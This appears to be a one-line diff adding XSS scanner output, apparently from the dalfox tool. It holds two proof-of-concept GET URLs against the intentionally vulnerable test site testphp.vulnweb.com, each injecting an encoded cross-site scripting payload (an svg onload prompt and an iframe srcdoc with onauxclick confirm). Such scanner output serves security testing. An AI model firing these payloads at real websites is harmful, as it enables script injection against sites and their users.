@@ -1,1 +1,1 @@
-
+[POC][R][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/listproducts.php?cat=%3CsVg%2Fonload%3Dprompt%281%29%3E&id=                        [POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/listproducts.php?cat=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dconfirm%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E&id=
